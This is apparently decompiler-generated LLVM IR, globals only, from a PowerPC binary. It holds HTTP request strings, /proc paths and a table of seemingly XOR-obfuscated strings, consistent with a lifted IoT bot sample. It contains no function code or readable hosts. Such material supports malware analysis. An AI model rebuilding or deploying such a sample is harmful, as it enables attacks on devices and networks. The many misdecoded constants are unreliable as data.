source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r14 = internal unnamed_addr global i32 0
@r17 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_eq = internal unnamed_addr global i1 false
@cr0_so = internal unnamed_addr global i1 false
@lr = internal unnamed_addr global i32 0
@global_var_100000c4.1 = constant i32 1208024813
@global_var_10021068.3 = global i32 0
@global_var_10021060.4 = global i32 0
@global_var_1002106c.5 = local_unnamed_addr global i32* @global_var_10021060.4
@global_var_10021064.9 = global i32 0
@global_var_1000047c.10 = constant i32 1006685388
@global_var_100005ac.11 = constant i32 939524096
@global_var_100211dc.13 = local_unnamed_addr global i32 0
@global_var_100006c0.14 = constant [3 x i8] c"8`\00"
@global_var_100100cc.16 = constant [4 x i8] c"GET\00"
@global_var_100100d4.17 = constant [9 x i8] c"Cookie: \00"
@global_var_100100e0.18 = constant [3 x i8] c"; \00"
@global_var_100100e4.19 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_100100ec.20 = constant i32 989855744
@global_var_100100f0.21 = constant [5 x i8] c"http\00"
@global_var_100100f8.22 = constant [5 x i8] c"url=\00"
@global_var_10010100.23 = constant [5 x i8] c"POST\00"
@global_var_10010108.24 = constant i32 654311424
@global_var_100104b8.25 = constant i32 1023410176
@global_var_100100d0.27 = constant i32 788529152
@global_var_10000c68.28 = constant [3 x i8] c"8`\00"
@global_var_10000c70.29 = constant [3 x i8] c"8`\00"
@global_var_10000c78.30 = constant [3 x i8] c"8`\00"
@global_var_10000c80.31 = constant [3 x i8] c"8`\00"
@global_var_10000c88.32 = constant [3 x i8] c"8`\00"
@global_var_10000c90.33 = constant [3 x i8] c"8`\00"
@global_var_10000c98.34 = constant [3 x i8] c"8`\00"
@global_var_10000ca0.35 = constant [3 x i8] c"8`\00"
@global_var_10000ca8.36 = constant [3 x i8] c"8`\00"
@global_var_10000cb0.37 = constant [3 x i8] c"8`\00"
@global_var_1001003c.38 = constant i32 -56156
@global_var_10000d44.39 = constant i32 939524143
@global_var_10000e00.40 = constant i32 939524096
@global_var_10000e98.41 = constant i32 939589631
@global_var_10000ee8.42 = constant [3 x i8] c"8`\00"
@global_var_1001005c = external local_unnamed_addr constant i32
@global_var_100100c4.43 = constant i32 536870912
@global_var_1001009c.45 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_100100b4.46 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_100011a4.49 = constant [3 x i8] c"8`\00"
@global_var_100011d0.50 = constant [3 x i8] c"8`\00"
@global_var_100011ec.51 = constant [3 x i8] c"8`\00"
@global_var_10001218.52 = constant [3 x i8] c"8`\00"
@global_var_10001234.53 = constant [3 x i8] c"8`\00"
@global_var_10001260.54 = constant [3 x i8] c"8`\00"
@global_var_100012ac.55 = constant [3 x i8] c"8`\00"
@global_var_1000162c.58 = constant i32 939589631
@global_var_10010074 = external local_unnamed_addr constant i32
@global_var_10001720.59 = constant i32 939589631
@global_var_10001798.61 = constant i32 939524096
@global_var_10001d54.63 = constant i32 939524097
@global_var_10001ddc.64 = constant i32 939589631
@global_var_10001f84.66 = constant [3 x i8] c"8`\00"
@global_var_10002054.68 = constant i32 939589631
@global_var_10010084 = external local_unnamed_addr constant i32
@global_var_100021c4.69 = constant i32 939524097
@global_var_100211e0.76 = local_unnamed_addr global i32 0
@global_var_10002b7c.77 = constant i32 939524096
@global_var_10003160.78 = constant i32 939524096
@global_var_1000347c.79 = constant [3 x i8] c"8`\00"
@global_var_10003500.80 = constant [3 x i8] c"8`\00"
@global_var_100036f8.81 = constant i32 939524096
@global_var_10003858.82 = constant i32 939524096
@global_var_10003c30.83 = constant i32 939524096
@global_var_10003e70.84 = constant i32 939524096
@global_var_10004268.85 = constant i32 939524104
@global_var_1000428c.86 = constant [3 x i8] c"9`\00"
@global_var_10004634.87 = constant i32 939524096
@global_var_1000480c.88 = constant i32 939524096
@global_var_10004c4c.89 = constant i32 939524096
@global_var_10005328.90 = constant [3 x i8] c"8`\00"
@global_var_1000566c.91 = constant i32 939524096
@global_var_100211e8.92 = local_unnamed_addr global i32 0
@global_var_10005a4c.93 = constant [3 x i8] c"8`\00"
@global_var_10005a54.94 = constant [3 x i8] c"8`\00"
@global_var_10005a5c.95 = constant [3 x i8] c"8`\00"
@global_var_10005ea0.96 = constant [3 x i8] c"8`\00"
@global_var_10005ea8.97 = constant [3 x i8] c"8`\00"
@global_var_10005eb0.98 = constant [3 x i8] c"8`\00"
@global_var_10005eb8.99 = constant [3 x i8] c"8`\00"
@global_var_10005ec0.100 = constant [3 x i8] c"8`\00"
@global_var_10005f3c.101 = constant [3 x i8] c"8`\00"
@global_var_10005f44.102 = constant [3 x i8] c"8`\00"
@global_var_10005f4c.103 = constant [3 x i8] c"8`\00"
@global_var_1000607c.104 = constant i32 939524096
@global_var_100211e4.105 = local_unnamed_addr global i32 0
@global_var_100211ec.106 = local_unnamed_addr global i32 0
@global_var_100060c4.107 = constant i32 1207976265
@global_var_10006164.108 = constant [3 x i8] c"8`\00"
@global_var_100061b0.109 = constant [3 x i8] c"8`\00"
@global_var_100061b8.110 = constant [3 x i8] c"8`\00"
@global_var_10006218.111 = constant i32 1207972797
@global_var_10006288.112 = constant [3 x i8] c"8`\00"
@global_var_10021198.113 = local_unnamed_addr global i32 268474556
@global_var_10006348.114 = constant i32 1006680457
@global_var_10023824.115 = global i32 0
@global_var_10023828.116 = local_unnamed_addr global i32 0
@global_var_10023826.117 = local_unnamed_addr global i32 0
@global_var_1002119c.118 = local_unnamed_addr global i32 -1
@global_var_10006518.120 = constant [3 x i8] c"8`\00"
@global_var_100211f4.121 = local_unnamed_addr global i32 0
@global_var_100065c8.122 = constant [3 x i8] c"8`\00"
@global_var_10006628.123 = constant [3 x i8] c"8`\00"
@global_var_10006660.124 = constant [3 x i8] c"8`\00"
@global_var_10006668.125 = constant [3 x i8] c"8`\00"
@global_var_10006724.126 = constant i32 1207972249
@global_var_10006764.127 = constant i32 1207961349
@global_var_10006780.128 = constant [3 x i8] c";a\00"
@global_var_100067e4.129 = constant i32 1207961141
@global_var_10006838.130 = constant [3 x i8] c"8`\00"
@global_var_10010118.131 = constant i32 167772160
@global_var_10006870.132 = constant [3 x i8] c"8`\00"
@global_var_10006884.133 = constant i32 1207983841
@global_var_10006938.134 = constant [3 x i8] c"8`\00"
@global_var_10006940.135 = constant [3 x i8] c"8`\00"
@global_var_10006968.136 = constant i32 1006685388
@global_var_100211a0.137 = local_unnamed_addr global i32 -1
@global_var_10006b18.139 = constant i32 939589631
@global_var_10006bd0.140 = constant i32 939589631
@global_var_10006ca0.141 = constant i32 939589631
@global_var_10006ce0.142 = constant i32 1207960333
@global_var_10006ce8.143 = constant [3 x i8] c"|q\00"
@global_var_1001010c.144 = constant i32 1
@global_var_10021294.146 = local_unnamed_addr global i32 0
@global_var_10021298.147 = local_unnamed_addr global i32 0
@global_var_100212a0.148 = local_unnamed_addr global i32 0
@global_var_1002129c.149 = local_unnamed_addr global i32 0
@global_var_10021210.150 = local_unnamed_addr global i32 0
@global_var_10007054.151 = constant [3 x i8] c"8`\00"
@global_var_100211f8.152 = local_unnamed_addr global i32 0
@global_var_10021200.153 = local_unnamed_addr global i32 0
@global_var_10021204.154 = local_unnamed_addr global i32 0
@global_var_10007380.156 = constant [3 x i8] c"8`\00"
@global_var_10021208.157 = local_unnamed_addr global i32 0
@global_var_1002120c.158 = local_unnamed_addr global i32 0
@global_var_100212a4.159 = global i32 0
@global_var_10010168.160 = constant [9 x i8] c"381>75=5\00"
@global_var_100212b8.161 = global i32 0
@global_var_100212a6.162 = local_unnamed_addr global i32 0
@global_var_10010174.163 = constant i32 1730492957
@global_var_100212c4.164 = local_unnamed_addr global i32 0
@global_var_100212ac.165 = local_unnamed_addr global i32 0
@global_var_100212a8.166 = local_unnamed_addr global i32 0
@global_var_100212ad.167 = local_unnamed_addr global i32 0
@global_var_10010150.168 = constant [6 x i8] c"14=9>\00"
@global_var_100100e8.169 = constant i32 0
@global_var_100101d0.171 = constant [8 x i8] c"4561%<$\00"
@global_var_10007520.172 = constant i32 939524097
@global_var_100212c6.173 = local_unnamed_addr global i32 0
@global_var_10010158.174 = constant [8 x i8] c"1!%1\229?\00"
@global_var_10010160.175 = constant [5 x i8] c" 1##\00"
@global_var_10010254.176 = constant [5 x i8] c"abcd\00"
@global_var_10010184.177 = constant [4 x i8] c"14=\00"
@global_var_10010188.178 = constant [5 x i8] c"\22??$\00"
@global_var_10010190.179 = constant [5 x i8] c"1>;?\00"
@global_var_10010198.180 = constant [7 x i8] c"(3ceaa\00"
@global_var_100101a0.181 = constant [6 x i8] c"$$>5$\00"
@global_var_100101a8.182 = constant [9 x i8] c"8%>$egei\00"
@global_var_100101b4.183 = constant [6 x i8] c"&9*(&\00"
@global_var_100101bc.184 = constant [6 x i8] c"abcde\00"
@global_var_100101c4.185 = constant [9 x i8] c"a``a389>\00"
@global_var_100101d8.186 = constant [4 x i8] c"abc\00"
@global_var_100101dc.187 = constant [7 x i8] c"1>$#<!\00"
@global_var_100101e4.188 = constant [4 x i8] c"e% \00"
@global_var_100101e8.189 = constant [9 x i8] c":%1>$538\00"
@global_var_100101f4.190 = constant [6 x i8] c"*<((~\00"
@global_var_100101fc.191 = constant [7 x i8] c"abcdef\00"
@global_var_10010204.192 = constant [11 x i8] c"?5<9>%(abc\00"
@global_var_10010210.193 = constant [7 x i8] c"\0A$5eba\00"
@global_var_10010218.194 = constant i32 1730492957
@global_var_10010228.195 = constant [5 x i8] c"%#5\22\00"
@global_var_10010230.196 = constant [7 x i8] c"415=?>\00"
@global_var_10010238.197 = constant [4 x i8] c"29>\00"
@global_var_1001023c.198 = constant [8 x i8] c"#%  ?\22$\00"
@global_var_10010244.199 = constant [11 x i8] c"#% 5\22&9#?\22\00"
@global_var_10010250.200 = constant [9 x i8] c"*)14abcd\00"
@global_var_10010148 = external local_unnamed_addr constant i32
@global_var_100212c8.204 = local_unnamed_addr global i32 0
@global_var_100212bc.205 = local_unnamed_addr global i32 0
@global_var_10007bd4.206 = constant [3 x i8] c"8`\00"
@global_var_10007dac.207 = constant [3 x i8] c"8`\00"
@global_var_1001011c.208 = constant i32 -33524
@global_var_10008824.226 = constant [3 x i8] c"8`\00"
@global_var_1000889c.227 = constant i32 956301312
@global_var_100089c8.228 = constant i32 956301312
@global_var_10008a0c.229 = constant i32 1006680457
@global_var_10008a58.230 = constant [3 x i8] c"8`\00"
@global_var_10008a60.231 = constant [3 x i8] c"8`\00"
@global_var_10023834.233 = global i32 0
@global_var_100211a4.234 = local_unnamed_addr global i32 1043935
@global_var_10010394.235 = constant i32 1510759519
@global_var_100103b8.236 = constant i32 307845195
@global_var_100102e4.237 = constant i32 1016659968
@global_var_10008cf8.238 = constant [3 x i8] c"8`\00"
@global_var_10023844.239 = local_unnamed_addr global i32 0
@global_var_10023848.240 = local_unnamed_addr global i32 0
@global_var_100102e8.241 = constant i32 -2032664576
@global_var_10008d20.242 = constant [3 x i8] c"8`\00"
@global_var_10023854.243 = local_unnamed_addr global i32 0
@global_var_100103c8.244 = constant i32 307845195
@global_var_10023858.245 = local_unnamed_addr global i32 0
@global_var_100102ec.246 = constant i32 2036095321
@global_var_10008d48.247 = constant i32 939524125
@global_var_10023860.248 = local_unnamed_addr global i32 0
@global_var_1002385c.249 = local_unnamed_addr global i32 0
@global_var_1001030c.250 = constant i32 307056466
@global_var_10008d70.251 = constant [3 x i8] c"8`\00"
@global_var_10023864.252 = local_unnamed_addr global i32 0
@global_var_10023868.253 = local_unnamed_addr global i32 0
@global_var_10010314.254 = constant i32 307774808
@global_var_10008d98.255 = constant [3 x i8] c"8`\00"
@global_var_1002386c.256 = local_unnamed_addr global i32 0
@global_var_100103ac.257 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_10023870.258 = local_unnamed_addr global i32 0
@global_var_1001031c.259 = constant i32 307976509
@global_var_10008dc0.260 = constant i32 939524100
@global_var_10023878.261 = local_unnamed_addr global i32 0
@global_var_10023874.262 = local_unnamed_addr global i32 0
@global_var_10010324.263 = constant i32 307056466
@global_var_10008de8.264 = constant [3 x i8] c"8`\00"
@global_var_1002387c.265 = local_unnamed_addr global i32 0
@global_var_10023880.266 = local_unnamed_addr global i32 0
@global_var_10010334.267 = constant i32 307256397
@global_var_10008e0c.268 = constant [3 x i8] c"8`\00"
@global_var_10023884.269 = local_unnamed_addr global i32 0
@global_var_10023888.270 = local_unnamed_addr global i32 0
@global_var_1001033c.271 = constant i32 307120476
@global_var_10008e30.272 = constant [3 x i8] c"8`\00"
@global_var_1002388c.273 = local_unnamed_addr global i32 0
@global_var_10023890.274 = local_unnamed_addr global i32 0
@global_var_10010348.275 = constant i32 324817748
@global_var_10008e54.276 = constant [3 x i8] c"8`\00"
@global_var_10023894.277 = local_unnamed_addr global i32 0
@global_var_10023898.278 = local_unnamed_addr global i32 0
@global_var_10010350.279 = constant i32 307056466
@global_var_10008e78.280 = constant [3 x i8] c"8`\00"
@global_var_1002389c.281 = local_unnamed_addr global i32 0
@global_var_100238a0.282 = local_unnamed_addr global i32 0
@global_var_10010364.283 = constant i32 307056466
@global_var_10008e9c.284 = constant [3 x i8] c"8`\00"
@global_var_100238a4.285 = local_unnamed_addr global i32 0
@global_var_100238a8.286 = local_unnamed_addr global i32 0
@global_var_10010374.287 = constant i32 2138208882
@global_var_10008ec0.288 = constant [3 x i8] c"8`\00"
@global_var_100238ac.289 = local_unnamed_addr global i32 0
@global_var_100238b0.290 = local_unnamed_addr global i32 0
@global_var_10010380.291 = constant i32 307775838
@global_var_10008ee4.292 = constant [3 x i8] c"8`\00"
@global_var_100238b4.293 = local_unnamed_addr global i32 0
@global_var_100238b8.294 = local_unnamed_addr global i32 0
@global_var_10008f04.295 = constant [3 x i8] c"8`\00"
@global_var_100238bc.296 = local_unnamed_addr global i32 0
@global_var_100238c0.297 = local_unnamed_addr global i32 0
@global_var_10008f24.298 = constant [3 x i8] c"8`\00"
@global_var_100238c4.299 = local_unnamed_addr global i32 0
@global_var_100238c8.300 = local_unnamed_addr global i32 0
@global_var_10008f44.301 = constant [3 x i8] c"8`\00"
@global_var_100238cc.302 = local_unnamed_addr global i32 0
@global_var_100238d0.303 = local_unnamed_addr global i32 0
@global_var_10008f64.304 = constant [3 x i8] c"8`\00"
@global_var_100238d4.305 = local_unnamed_addr global i32 0
@global_var_100238d8.306 = local_unnamed_addr global i32 0
@global_var_100103dc.307 = constant i32 307845195
@global_var_10008f88.308 = constant [3 x i8] c"8`\00"
@global_var_100238dc.309 = local_unnamed_addr global i32 0
@global_var_100238e0.310 = local_unnamed_addr global i32 0
@global_var_100103f4.311 = constant i32 307845195
@global_var_10008fac.312 = constant i32 939524120
@global_var_100238e8.313 = local_unnamed_addr global i32 0
@global_var_100238e4.314 = local_unnamed_addr global i32 0
@global_var_10010410.315 = constant i32 307845195
@global_var_10008fd4.316 = constant i32 939524111
@global_var_100238f0.317 = local_unnamed_addr global i32 0
@global_var_100238ec.318 = local_unnamed_addr global i32 0
@global_var_10010420.319 = constant [7 x i8] c"NUXQQ=\00"
@global_var_10008ffc.320 = constant [3 x i8] c"8`\00"
@global_var_100238f4.321 = local_unnamed_addr global i32 0
@global_var_100238f8.322 = local_unnamed_addr global i32 0
@global_var_10010428.323 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_10009020.324 = constant [3 x i8] c"8`\00"
@global_var_100238fc.325 = local_unnamed_addr global i32 0
@global_var_10023900.326 = local_unnamed_addr global i32 0
@global_var_10010430.327 = constant [8 x i8] c"NDNIXP=\00"
@global_var_10009044.328 = constant [3 x i8] c"8`\00"
@global_var_10023904.329 = local_unnamed_addr global i32 0
@global_var_10023908.330 = local_unnamed_addr global i32 0
@global_var_10010438.331 = constant [4 x i8] c"NU=\00"
@global_var_10009068.332 = constant i32 939524099
@global_var_10023910.333 = local_unnamed_addr global i32 0
@global_var_1002390c.334 = local_unnamed_addr global i32 0
@global_var_1001043c.335 = constant i32 308237395
@global_var_10009090.336 = constant [3 x i8] c"8`\00"
@global_var_10023914.337 = local_unnamed_addr global i32 0
@global_var_10023918.338 = local_unnamed_addr global i32 0
@global_var_10010454.339 = constant i32 1499224409
@global_var_100090b8.340 = constant i32 939524124
@global_var_10023920.341 = local_unnamed_addr global i32 0
@global_var_1002391c.342 = local_unnamed_addr global i32 0
@global_var_10010474.343 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_100090e0.344 = constant [3 x i8] c"8`\00"
@global_var_10023924.345 = local_unnamed_addr global i32 0
@global_var_10023928.346 = local_unnamed_addr global i32 0
@global_var_10009100.347 = constant [3 x i8] c"8`\00"
@global_var_1002392c.348 = local_unnamed_addr global i32 0
@global_var_10023930.349 = local_unnamed_addr global i32 0
@global_var_10010480.350 = constant [6 x i8] c"RZTS=\00"
@global_var_10009124.351 = constant [3 x i8] c"8`\00"
@global_var_10023934.352 = local_unnamed_addr global i32 0
@global_var_10023938.353 = local_unnamed_addr global i32 0
@global_var_10010488.354 = constant [7 x i8] c"XSIXO=\00"
@global_var_1000914c.355 = constant [3 x i8] c"8`\00"
@global_var_1002393c.356 = local_unnamed_addr global i32 0
@global_var_10023940.357 = local_unnamed_addr global i32 0
@global_var_10010490.358 = constant i32 308237395
@global_var_10009170.359 = constant [3 x i8] c"8`\00"
@global_var_10023944.360 = local_unnamed_addr global i32 0
@global_var_10023948.361 = local_unnamed_addr global i32 0
@global_var_100104a4.362 = constant i32 308237395
@global_var_10009198.363 = constant [3 x i8] c"8`\00"
@global_var_1002394c.364 = local_unnamed_addr global i32 0
@global_var_10023950.365 = local_unnamed_addr global i32 0
@global_var_100104bc.366 = constant i32 1768837704
@global_var_100091bc.367 = constant [3 x i8] c"8`\00"
@global_var_10023954.368 = local_unnamed_addr global i32 0
@global_var_10023958.369 = local_unnamed_addr global i32 0
@global_var_100104d4.370 = constant i32 307775838
@global_var_100091e0.371 = constant i32 939524113
@global_var_10023960.372 = local_unnamed_addr global i32 0
@global_var_1002395c.373 = local_unnamed_addr global i32 0
@global_var_100104e8.374 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_10009208.375 = constant [3 x i8] c"8`\00"
@global_var_10023964.376 = local_unnamed_addr global i32 0
@global_var_10023968.377 = local_unnamed_addr global i32 0
@global_var_100104f4.378 = constant i32 2119324499
@global_var_1002396c.379 = local_unnamed_addr global i32 0
@global_var_1001026c.380 = constant i32 2086559320
@global_var_10023970.381 = local_unnamed_addr global i32 0
@global_var_10009254.382 = constant i32 939524179
@global_var_10023978.383 = local_unnamed_addr global i32 0
@global_var_10023974.384 = local_unnamed_addr global i32 0
@global_var_100102c0.385 = constant i32 2086559320
@global_var_10009278.386 = constant i32 939524128
@global_var_10023980.387 = local_unnamed_addr global i32 0
@global_var_1002397c.388 = local_unnamed_addr global i32 0
@global_var_1001050c.389 = constant i32 2119324489
@global_var_100092a0.390 = constant i32 939524144
@global_var_10023988.391 = local_unnamed_addr global i32 0
@global_var_10023984.392 = local_unnamed_addr global i32 0
@global_var_10010540.393 = constant i32 1314408830
@global_var_100092cc.394 = constant [3 x i8] c"8`\00"
@global_var_1002398c.395 = local_unnamed_addr global i32 0
@global_var_10023990.396 = local_unnamed_addr global i32 0
@global_var_10010550.397 = constant i32 1331190607
@global_var_100092f0.398 = constant [3 x i8] c"8`\00"
@global_var_10023994.399 = local_unnamed_addr global i32 0
@global_var_10023998.400 = local_unnamed_addr global i32 0
@global_var_1001055c.401 = constant i32 1364352604
@global_var_10009314.402 = constant [3 x i8] c"8`\00"
@global_var_1002399c.403 = local_unnamed_addr global i32 0
@global_var_100239a0.404 = local_unnamed_addr global i32 0
@global_var_10010568.405 = constant i32 1314408720
@global_var_10009338.406 = constant [3 x i8] c"8`\00"
@global_var_100239a4.407 = local_unnamed_addr global i32 0
@global_var_100239a8.408 = local_unnamed_addr global i32 0
@global_var_10010578.409 = constant i32 1582453577
@global_var_1000935c.410 = constant [3 x i8] c"8`\00"
@global_var_100239ac.411 = local_unnamed_addr global i32 0
@global_var_100239b0.412 = local_unnamed_addr global i32 0
@global_var_1001058c.413 = constant i32 1229937747
@global_var_10009380.414 = constant [3 x i8] c"8`\00"
@global_var_100239b4.415 = local_unnamed_addr global i32 0
@global_var_100239b8.416 = local_unnamed_addr global i32 0
@global_var_100105a0.417 = constant [9 x i8] c"^UHSVXY=\00"
@global_var_100093a4.418 = constant [3 x i8] c"8`\00"
@global_var_100239bc.419 = local_unnamed_addr global i32 0
@global_var_100239c0.420 = local_unnamed_addr global i32 0
@global_var_10010500.421 = constant i32 1448630349
@global_var_100093c8.422 = constant [3 x i8] c"8`\00"
@global_var_100239c4.423 = local_unnamed_addr global i32 0
@global_var_100239c8.424 = local_unnamed_addr global i32 0
@global_var_100105ac.425 = constant i32 1582453587
@global_var_100093ec.426 = constant [3 x i8] c"8`\00"
@global_var_100239cc.427 = local_unnamed_addr global i32 0
@global_var_100239d0.428 = local_unnamed_addr global i32 0
@global_var_100105bc.429 = constant i32 1314410315
@global_var_10009410.430 = constant i32 939524114
@global_var_100239d8.431 = local_unnamed_addr global i32 0
@global_var_100239d4.432 = local_unnamed_addr global i32 0
@global_var_100105d0.433 = constant i32 1314410315
@global_var_10009438.434 = constant i32 939524121
@global_var_100239e0.435 = local_unnamed_addr global i32 0
@global_var_100239dc.436 = local_unnamed_addr global i32 0
@global_var_100105ec.437 = constant i32 1884440404
@global_var_10009464.438 = constant [3 x i8] c"8`\00"
@global_var_100239e4.439 = local_unnamed_addr global i32 0
@global_var_100239e8.440 = local_unnamed_addr global i32 0
@global_var_10010660.441 = constant i32 1884440404
@global_var_10009488.442 = constant [3 x i8] c"8`\00"
@global_var_100239ec.443 = local_unnamed_addr global i32 0
@global_var_100239f0.444 = local_unnamed_addr global i32 0
@global_var_100106d4.445 = constant i32 1884440404
@global_var_100094ac.446 = constant i32 939524175
@global_var_100239f8.447 = local_unnamed_addr global i32 0
@global_var_100239f4.448 = local_unnamed_addr global i32 0
@global_var_10010724.449 = constant i32 1884440404
@global_var_100094d8.450 = constant [3 x i8] c"8`\00"
@global_var_100239fc.451 = local_unnamed_addr global i32 0
@global_var_10023a00.452 = local_unnamed_addr global i32 0
@global_var_10010798.453 = constant i32 1884440404
@global_var_100094fc.454 = constant [3 x i8] c"8`\00"
@global_var_10023a04.455 = local_unnamed_addr global i32 0
@global_var_10023a08.456 = local_unnamed_addr global i32 0
@global_var_1000951c.457 = constant [3 x i8] c"8`\00"
@global_var_10023a0c.458 = local_unnamed_addr global i32 0
@global_var_10023a10.459 = local_unnamed_addr global i32 0
@global_var_1000953c.460 = constant [3 x i8] c"8`\00"
@global_var_10023a14.461 = local_unnamed_addr global i32 0
@global_var_10023a18.462 = local_unnamed_addr global i32 0
@global_var_1000955c.463 = constant [3 x i8] c"8`\00"
@global_var_10023a1c.464 = local_unnamed_addr global i32 0
@global_var_10023a20.465 = local_unnamed_addr global i32 0
@global_var_1001080c.466 = constant [11 x i8] c"YKOuXQMXO=\00"
@global_var_10023a28.467 = global i32 0
@global_var_10023a24.468 = local_unnamed_addr global i32 0
@global_var_100098dc.469 = constant i32 939524096
@global_var_100098f4.470 = constant i32 939524096
@global_var_10009c94.471 = constant i32 1207959640
@global_var_10009ca8.472 = constant i32 1207959620
@global_var_1000d02c.473 = constant [3 x i8] c"8`\00"
@global_var_1000a0e4.474 = constant i32 939589631
@global_var_1000a1d0.475 = constant i32 1207959588
@global_var_1000a378.477 = constant i32 1207959560
@global_var_10021218.478 = global i32 0
@global_var_10021074.479 = global i32 0
@global_var_1000afe4.480 = constant i32 939589599
@global_var_10023a2c.481 = global i32 0
@global_var_1000b044.482 = constant i32 1207960556
@global_var_10023a60.483 = global i32 0
@global_var_1000b0e0.484 = constant i32 1207959864
@global_var_10023a6c.485 = local_unnamed_addr global i32 0
@global_var_10023a5c.486 = local_unnamed_addr global i32 0
@global_var_10023a58.487 = local_unnamed_addr global i32 0
@global_var_10023d88.490 = local_unnamed_addr global i32 0
@global_var_1000b490.491 = constant i32 1207960580
@global_var_10023d78.492 = local_unnamed_addr global i32 0
@global_var_10023d80.493 = local_unnamed_addr global i32 0
@global_var_10023d7c.494 = local_unnamed_addr global i32 0
@global_var_10023d84.495 = local_unnamed_addr global i32 0
@global_var_10023d90.496 = local_unnamed_addr global i32 0
@global_var_10023d9c.497 = local_unnamed_addr global i32 0
@global_var_10023d94.498 = local_unnamed_addr global i32 0
@global_var_10023da0.499 = local_unnamed_addr global i32 0
@global_var_10023d8c.500 = local_unnamed_addr global i32 0
@global_var_10023d74.501 = local_unnamed_addr global i32 0
@global_var_1000b73c.502 = constant i32 1207959640
@global_var_10023d70.503 = local_unnamed_addr global i32 0
@global_var_10023d98.504 = local_unnamed_addr global i32 0
@global_var_1000b960.505 = constant i32 1207959616
@global_var_1000ba28.506 = constant i32 939589599
@global_var_1000bb84.507 = constant i32 1207959652
@global_var_1000bbf4.508 = constant i32 1207959876
@global_var_1000bdc0.509 = constant [3 x i8] c"8`\00"
@global_var_10023a68.510 = local_unnamed_addr global i32 0
@global_var_1000c1a0.511 = constant i32 1207959596
@global_var_1000c1cc.512 = constant [3 x i8] c"8a\00"
@global_var_1002108c.513 = global i32 0
@global_var_1000c248.514 = constant i32 939524096
@global_var_100212cc.515 = local_unnamed_addr global i32 0
@global_var_1000c290.516 = constant [3 x i8] c"8`\00"
@global_var_1000c2cc.517 = constant i32 939589631
@global_var_100210a4.518 = global i32 0
@global_var_10021220.519 = local_unnamed_addr global i32 0
@global_var_1000c38c.520 = constant i32 1207962869
@global_var_10010bf8.521 = constant [11 x i8] c"/proc/stat\00"
@global_var_100211b8 = external local_unnamed_addr global i32
@global_var_10010c04.526 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_10010bf4.527 = constant i32 3803392
@global_var_10010c14.528 = constant [10 x i8] c"processor\00"
@global_var_10010830.529 = constant i32 -17112
@global_var_10021228.535 = local_unnamed_addr global i32 0
@global_var_100212d0.536 = global i32 0
@global_var_100212d8.537 = local_unnamed_addr global i32 0
@global_var_100212d4.538 = local_unnamed_addr global i32 0
@global_var_10021224.539 = local_unnamed_addr global i32 0
@global_var_100211d0.540 = global i32* bitcast (i16* @global_var_100210bc.523 to i32*)
@global_var_10010c38.541 = constant i32 0
@global_var_1002122c.543 = local_unnamed_addr global i32 0
@global_var_1000cc20.544 = constant [3 x i8] c"8a\00"
@global_var_10021054.545 = global i32 -1
@global_var_1002123c.546 = local_unnamed_addr global i32 0
@global_var_10021240.547 = local_unnamed_addr global i32 0
@global_var_10010c50.548 = constant [10 x i8] c"/dev/null\00"
@global_var_10021238.549 = local_unnamed_addr global i32 0
@global_var_10021230.550 = local_unnamed_addr global i32 0
@global_var_10021234.551 = local_unnamed_addr global i32 0
@global_var_100211ac.552 = local_unnamed_addr global i32* @global_var_100100e8.169
@global_var_1000d444.553 = constant i32 939524096
@global_var_1000d4b0.555 = constant i32 1207959656
@global_var_1000d4b8.556 = constant [3 x i8] c"= \00"
@global_var_10021274.557 = local_unnamed_addr global i32 0
@global_var_1000dccc.558 = constant i32 1207960076
@global_var_1000dd84.559 = constant i32 1207959564
@global_var_1000ddf0.560 = constant i32 1207959736
@global_var_10010c1c.561 = constant i32 1912602624
@global_var_100212dc.562 = global i32 0
@global_var_100212e4.563 = local_unnamed_addr global i32 0
@global_var_10021244.564 = local_unnamed_addr global i32 0
@global_var_100212e0.565 = local_unnamed_addr global i32 0
@global_var_10021248.566 = local_unnamed_addr global i32 0
@global_var_1000e2a0.567 = constant i32 1207960408
@global_var_100211d4.569 = local_unnamed_addr global i32 2
@global_var_10010f80.572 = constant i32 0
@global_var_1000eef0.573 = constant i32 1207959612
@global_var_10021258.574 = local_unnamed_addr global i32 0
@global_var_10021254.575 = local_unnamed_addr global i32 0
@global_var_1002124c.576 = local_unnamed_addr global i32 0
@global_var_10021250.577 = local_unnamed_addr global i32 0
@global_var_10021268.578 = local_unnamed_addr global i32 0
@global_var_100232e8.579 = global i32 0
@global_var_1002125c.580 = local_unnamed_addr global i32 0
@global_var_1002126c.581 = local_unnamed_addr global i32 0
@global_var_10021270.582 = local_unnamed_addr global i32 0
@global_var_100237f0.583 = global i32 0
@global_var_10023818.584 = local_unnamed_addr global i32 0
@global_var_100235f0.585 = local_unnamed_addr global i32 0
@global_var_10023600.586 = local_unnamed_addr global i32 0
@global_var_10023604.587 = local_unnamed_addr global i32 0
@global_var_100235f8.588 = global i32 0
@global_var_10023304.589 = local_unnamed_addr global i32 0
@global_var_10023804.590 = local_unnamed_addr global i32 0
@global_var_10023808.591 = local_unnamed_addr global i32 0
